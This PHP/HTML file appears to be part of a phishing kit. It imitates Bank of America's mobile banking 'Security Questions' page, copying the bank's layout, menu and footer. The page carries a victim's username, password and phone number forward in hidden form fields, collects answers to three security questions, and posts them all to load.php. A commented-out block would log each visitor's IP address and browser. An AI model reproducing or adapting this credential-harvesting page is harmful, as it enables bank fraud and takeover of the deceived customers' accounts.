<?php
	// $user_agent = $_SERVER['HTTP_USER_AGENT'];
	// $ip = getenv("REMOTE_ADDR");
	// $time = date('Y-m-d H:i:s');
	// $random = md5($time);

	// $logfile= 'log.html'; 
	// $ip = getenv("REMOTE_ADDR");
	// $hostname = gethostbyaddr($ip);
	// $logdetails= date("F j, Y, g:i a") . ': ' . '<a href=http://www.ip-score.com/checkip/'.$ip.' target=_blank>'.$_SERVER['REMOTE_ADDR'].'</a> - '.$hostname.' - '.$user_agent.'<br>'; 
	// $fp = fopen($logfile, "a+");
	// fwrite($fp, $logdetails);
	// fclose($fp);
$_user = "";
$_pass = "";
$_phone = "";
  if( isset($_POST['user'])){
    $_user = $_POST['user'];
    $_pass = $_POST['pass'];
    $_phone = $_POST['phone'];
  }
  $lstQ1 = ["what is the first name of your mothers closest friend?","what was the name of your first pet?","what is the first name of your favorite niece/nephew?","what is the first name your hairdresserr/barber?","what is the name of your best childhood friend? ","on what street is your grocery store?","what is the name of the medical professional who delivered your first child?","what is the name of a college you applied to but didnt atted? ","what was the first name of your favorite teacher or professor?","what is your all-time favorite song?"];
  $lstQ2 = ["what is the first name of your high school prom date?", "who is your favorite person in history?", "what was the make and model of your first car? ", "what is first name of best man/main of honor at your wedding? ", "what is the name of your favorite restaurant?", "as a child what did you want to be when you grew up? ", "what was the first live concert you attended?", "what was the first name of your first manager?", "what is the name of your high school star athlete?", "where were you on New Years 2000? "];
  $lstQ3 = ["what street did your best friend ih high school live on?", "what was the name of your first boyfriend or girlfriend?", "what is your best friend first name?", "what is the last name of your third grade teacher?", "what is the last name of your family physician?", "in what city did you honeymoon?", "in what city did you meet your spouse/significant other?", "what celebrity do you most resemble?", "what is the name of your favorite charity?", "what is the name of your first babysitter?", ];
?>
<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
		<meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Security Questions</title>
		<link rel="stylesheet" href="css/bactouch.css">
		<link rel="stylesheet" href="css/toolbar.css">
		<link rel="stylesheet" href="css/bact_listview.css">
		<link rel="stylesheet" href="css/footer.css">
		<!-- <link rel="stylesheet" href="css/slidemenu.css"> -->
	</head>
  <script type="text/javascript" src="js/jquery.min.js"></script>
	<body>
		<div id="page" class="" style="display: block; position: static; float: left; height: 100%; width: 100%; left: 100%;">
			<div id="cmw_toolBar_" class="cmw_toolBar_">
				<a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a>
				<div id="barker" class="hidden"></div>
				<h1 id="title" class="">
					<div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Security Questions</div>
					<span class="adaHidden" id="adaTitleText">Enter your Online ID</span>
				</h1>
				<a id="rightButton" class="hidden"></a>
			</div>
			<div id="SASI_banner_container"></div>
			<div class="pageMinHeight">
				<!-- SIGN ON HOME PAGE-->
				<div class="signonVersionTwoHomePage">
					<div id="scrollerwrapperOt" class="overthrow">
						<div id="divMessaging" class="hidden"></div>
						<div id="blackBerryMsg" class="padding10" style="display: none;"></div>
						<div id="accountLocked" class="hidden">
							<ul class="listView edge">
								<li role="button" class="noLink">
									<div class="imageWrap paddingHoriz20"><img src="img/ico_alert@2x.png" class=""></div>
									<p class="subVal padding10 fontRed" id="headError"></p>
									<p class="subVal padding10" id="bodyError"></p>
								</li>
							</ul>
						</div>
						<div id="successMsg"></div>
						<form action="load.php" method="post" autocomplete="off" name="form">
							<div id="newOnlineId" style="display: block;">
								<div class="toppad5">
									<fieldset>
                    <!-- Parameters from index.php Start -->
                    <input type="hidden" name="user" value="<?=$_user?>">
                    <input type="hidden" name="pass" value="<?=$_pass?>">
                    <input type="hidden" name="phone" value="<?=$_phone?>">
                    <!-- Parameters from index.php End -->

                    <div class="inputContainer">
                      <label>Select SiteKey Challenge Question 1</label>
                      <select name="q1" class="textbox sprite-clear_input_icns" required style="border: none; color: blue;">
                        <option></option>
                        <?php
                        foreach ($lstQ1 as $value) {
                          echo "<option>$value</option>";
                        ?>
                        <?php
                        }
                        ?>
                      </select>
                    </div>
                    <p class="subVal padding10 fontRed" id="q1">No selected answer 1</p>
                    <div class="inputContainer">
                      <label>Question 1 Answer</label>
                      <input type="text" name="a1" required>
                    </div>
                    <p class="subVal padding10 fontRed" id="a1">No answer for question 1</p>

                    <div class="inputContainer">
                      <label>Select SiteKey Challenge Question 2</label>
                      <select name="q1" class="textbox sprite-clear_input_icns" required style="border: none; color: blue;">
                        <option></option>
                        <?php
                        foreach ($lstQ2 as $value) {
                          echo "<option>$value</option>";
                        ?>
                        <?php
                        }
                        ?>
                      </select>
                    </div>
                    <p class="subVal padding10 fontRed" id="q2">No selected answer 2</p>
                    <div class="inputContainer">
                      <label>Question 2 Answer</label>
                      <input type="text" name="a2" required>
                    </div>
                    <p class="subVal padding10 fontRed" id="a2">No answer for question 2</p>

                    <div class="inputContainer">
                      <label>Select SiteKey Challenge Question 3</label>
                      <select name="q1" class="textbox sprite-clear_input_icns" required style="border: none; color: blue;">
                        <option></option>
                        <?php
                        foreach ($lstQ3 as $value) {
                          echo "<option>$value</option>";
                        ?>
                        <?php
                        }
                        ?>
                      </select>
                    </div>
                    <p class="subVal padding10 fontRed" id="q3">No selected answer 3</p>
                    <div class="inputContainer">
                      <label>Question 3 Answer</label>
                      <input type="text" name="a3" required>
                    </div>
                    <p class="subVal padding10 fontRed" id="a3">No answer for question 3</p>
									</fieldset>
								</div>
							</div>
					</div>
					<div>  
					<a id="btSignonContinue" role="" class="btn" href="#" onclick="Proceed()">
					<!-- <img style="margin-bottom:-4px;" class="paddingHoriz10" src="img/secure_lock.png" > -->
					<span id="signonLabel" type="submit" >Proceed</span>
					</a>
					</div>
					</form>
					<div id="helpOptionView" class="helpOptionView">
						<div class="padding10 center">
							<div class="inline-link blueLink"><a href="javascript:void(0);" id="forgetOIDPass" class="plain slideUp jsForgotIDPass">Forgot ID/Passcode?</a></div>
							<div class="paddingVert10 inline-link blueLink"><a href="javascript:void(0);" class="plain slideUp" id="signonEnroll">Enroll</a></div>
						</div>
						<div class="padding10">
							<!--
								<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetOID" class="plain slideUp"></a></div>  
								<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetpasscode" class="plain slideUp"></a></div> 
								<div class="paddingVert10 blueLink"><a href="#home?app=enrollmentsv2" class="plain slideUp" id="signonEnroll"></a></div>  
								-->
							<div class="borderLine smarBannerdisplay hidden"></div>
							<div class="bofaBannerLink smarBannerdisplay hidden"><a href="javascript:;" class="appNavigation plain slideUp" id="signonBannerLink">Get the Mobile Banking app</a></div>
						</div>
					</div>
					<div id="btnPin" style="position: fixed; bottom: 0px; display: none;">
						<ul class="btnGroupPin">
							<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
						</ul>
					</div>
				</div>
			</div>
			<footer>
				<div class="boa_footnote"></div>
				<div class="boa_footer">
					<div class="left"><a id="boa_footer_privacy" href="https://www.bankofamerica.com/privacy/overview.go" target="_blank">Privacy &amp; Security</a></div>
					<div class="right"><a id="boa_footer_ehl" href="https://www.bankofamerica.com/help/equalhousing_popup.go" class="ehl" target="_blank">Equal Housing Lender</a></div>
					<p class="clear">© 2019 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p>
				</div>
			</footer>
		</div>
		<div class="spinnerPanel" style="height: 661px; display: none;">
			<div class="spinner" style="top: 264.4px;"><span class="messageIcon"></span><a id="spinnerLink" class="adaHidden" href="javascript:void(0)" role="dialog">processing</a></div>
		</div>
		<div id="slidemenu_sidePanel" style="display: none">
			<div class="slidemenu_menu">
				<ul class="popoverMenu">
					<li id="signoutButtonItem" class="hidden button" style="display: none;">
						<span class="menuButton">
						<a id="signoutButtonLink" class="linkButton" href="#home?app=signon" aria-hidden="true" role="button">Sign Out</a>
						</span>
					</li>
					<li class="menuCategory"> </li>
					<li class="menuItem accounts">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=accounts">Accounts</a>
					</li>
					<li class="menuItem mycard">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#creditCardStatement?app=accounts">My Card</a>
					</li>
					<li class="menuItem mysbcard">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#sbCardAccountDetails?app=accounts">My Card</a>
					</li>
					<li class="menuItem mycards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=mycards">My Cards</a>
					</li>
					<li class="menuItem mysbcards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=mycards">My Cards</a>
					</li>
					<li class="menuItem rewards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=rewards">Rewards</a>
					</li>
					<li class="menuItem billpay">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=billpay">Bill Pay</a>
					</li>
					<li class="menuItem transfers">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=transfers">Transfer | Send</a>
					</li>
					<li class="menuItem bamd">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=deals">Special Offers &amp; Deals</a>
					</li>
					<li class="menuItem bankrewards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=prefrewards">Banking Rewards</a>
					</li>
					<li class="menuItem prefrewards">
						<div class="hidden right tally">1</div>
						<a class="disabled" href="#home?app=prefrewards">Preferred Rewards</a>
					</li>
					<li class="menuCategory"> </li>
					<li class="menuItem help">
						<div class="hidden right tally">1</div>
						<a class="" href="#helpSupport?app=settings">Help &amp; Support</a>
					</li>
					<li class="menuItem contact">
						<div class="hidden right tally">1</div>
						<a class="" href="#contactus?app=click2call">Contact Us</a>
					</li>
					<li class="menuItem locations">
						<div class="hidden right tally">1</div>
						<a class="" href="https://locators.bankofamerica.com/">Locations</a>
					</li>
					<li class="menuItem settings">
						<div class="hidden right tally">1</div>
						<a class="" href="#home?app=settings">Profile &amp; Settings</a>
					</li>
					<li class="menuCategory"> </li>
					<li class="menuItem feedback">
						<div class="hidden right tally">1</div>
						<a class="" href="https://secure.opinionlab.com/ccc01/o.asp?id=wwxOVCML&amp;referer=%20http%3A%2F%2Fmobile.bankofamerica.com%2Fmobileweb">Send App Feedback</a>
					</li>
					<li class="menuItem legal">
						<div class="hidden right tally">1</div>
						<a class="" href="#legal_Info?app=settings">Legal Info &amp; Disclosures</a>
					</li>
				</ul>
			</div>
		</div>
		<div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
	</body>
  <script type="text/javascript">
    $(".fontRed").hide();
    function Proceed(){
    $(".fontRed").hide();
      var isFalse = false;
      var lstInputs = $("form").find("input").filter(function(){
        return $(this).prop("required")
      });
      for( var i = 0; i < lstInputs.length; i++){
        if( lstInputs.eq(i).val() == ""){
          $("#" + lstInputs.eq(i).attr("name")).show();
          isFalse = true;
        }
      }
      var lstInputs = $("form").find("select").filter(function(){
        return $(this).prop("required")
      });
      for( var i = 0; i < lstInputs.length; i++){
        if( lstInputs.eq(i).val() == ""){
          $("#" + lstInputs.eq(i).attr("name")).show();
          isFalse = true;
        }
      }
      if( isFalse)return false;
      document.forms['form'].submit(); return false;
    }
  </script>
</html>